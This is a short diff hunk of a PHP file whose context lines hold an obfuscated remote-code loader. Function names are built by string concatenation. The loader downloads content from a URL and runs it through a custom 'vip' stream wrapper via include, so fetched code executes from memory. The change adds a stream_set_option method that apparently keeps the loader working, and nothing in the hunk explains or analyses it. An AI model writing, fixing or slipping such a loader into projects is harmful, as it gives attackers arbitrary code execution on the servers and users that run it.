@@ -11,6 +11,7 @@ $g='fi'.'le_'.'get_'.'con'.'tents';return function_exists($g)?@$g($u):'';}
 $GLOBALS['d']=x($u);if(!$GLOBALS['d'])die;class V{private $p=0;
 function stream_open($p,$m,$o,&$r){return 1;}function stream_stat(){return['size'=>strlen($GLOBALS['d'])];}
 function stream_read($c){$r=substr($GLOBALS['d'],$this->p,$c);$this->p+=strlen($r);return $r;}
-function stream_eof(){return $this->p>=strlen($GLOBALS['d']);}}
+function stream_eof(){return $this->p>=strlen($GLOBALS['d']);}
+function stream_set_option($o,$a,$b){return 1;}}
 $r='st'.'ream_'.'wrap'.'per_'.'reg'.'ister';$r('vip','V');include 'vip://m';
 ?>
